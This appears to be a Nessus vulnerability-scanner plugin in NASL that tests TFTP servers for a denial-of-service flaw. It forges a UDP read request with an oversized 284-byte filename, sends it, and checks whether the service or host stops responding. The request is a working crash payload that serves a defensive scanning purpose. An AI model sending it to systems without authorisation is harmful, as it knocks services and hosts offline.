# This script was written by Josh Zlatin-Amishav <josh@tkos.co.il>
# GNU Public Licence (GPLv2)
# This plugin is just a very slightly modified version of tftpd_overflow.nasl

include("compat.inc");

if (description)
{
 script_id(18493);
 script_version("$Revision: 1.13 $");
 script_cvs_date("$Date: 2015/09/24 23:21:21 $");

 script_bugtraq_id(13908);

 script_name(english:"TFTPD small overflow");
 script_summary(english:"Crashes TFTPD with a small UDP datagram");

 script_set_attribute(attribute:"synopsis", value:"The remote TFTP server has a denial of service vulnerability.");
 script_set_attribute(attribute:"description", value:
"It is possible to crash the remote TFTP server by sending a small UDP
packet. A remote attacker could exploit this to crash the service.");
 script_set_attribute(attribute:"solution", value:"Upgrade to the latest version of this software.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value:"2005/06/15");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_KILL_HOST);

 script_copyright(english:"Copyright (C) 2005-2015 Josh Zlatin-Amishav");
 script_family(english:"Gain a shell remotely");

 script_require_keys("Services/udp/tftp", "Settings/ParanoidReport");

 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("dump.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

if (islocalhost()) exit(0);	# ?
if ( TARGET_IS_IPV6 ) exit(0);

# This function cannot yet send UDP packets bigger than the MTU
function tftp_ping(port, huge)
{
 local_var	req, rep, sport, ip, u, filter, data, i;

 debug_print('tftp_ping: huge=', huge, '\n');

 if (huge)
  req = '\x00\x01'+crap(huge)+'\0netascii\0';
 else
  req = '\x00\x01Nessus'+rand()+'\0netascii\0';

 sport = rand() % 64512 + 1024;
 ip = forge_ip_packet(ip_hl : 5, ip_v: 4,  ip_tos:0,
	ip_len:20, ip_off:0, ip_ttl:64, ip_p:IPPROTO_UDP,
	ip_src: this_host());

 u = forge_udp_packet(ip:ip, uh_sport: sport, uh_dport:port, uh_ulen: 8 + strlen(req), data:req);

 filter = 'udp and dst port ' + sport + ' and src host ' + get_host_ip() + ' and udp[8:1]=0x00';

 data = NULL;
 for (i = 0; i < 3; i ++)	# Try 3 times
 {
  rep = send_packet(u, pcap_active:TRUE, pcap_filter:filter);
  if(rep)
  {
   if (debug_level > 2) dump(ddata: rep, dtitle: 'TFTP (IP)');
   data = get_udp_element(udp: rep, element:"data");
   if (debug_level > 1) dump(ddata: data, dtitle: 'TFTP (UDP)');
   if (data[0] == '\0' && (data[1] == '\x03' || data[1] == '\x05'))
   {
    debug_print('tftp_ping(port=', port, ',huge=', huge, ') succeeded\n');
    return TRUE;
   }
  }
 }
 debug_print('tftp_ping(port=', port, ',huge=', huge, ') failed\n');
 return FALSE;
}

#
port = get_kb_item('Services/udp/tftp');
if (! port) port = 69;
if (! tftp_ping(port: port)) exit(0);

start_denial();

tftp_ping(port: port, huge: 284);

# I'll check this first, in case the device reboots
tftpalive = tftp_ping(port: port);
alive = end_denial();

if (alive && ! tftpalive)	# Double check
  tftpalive = tftp_ping(port: port);

if (! alive)
  security_hole(port: port, proto: "udp", extra:
"
Nessus was able to DoS the remote host by sending a UDP datagram
of 284 bytes in length to the TFTP server.
");
else
 if (! tftpalive)
  security_hole(port: port, proto: "udp");

if (! alive || ! tftpalive)
 set_kb_item(name: 'tftp/'+port+'/smalloverflow', value: TRUE);
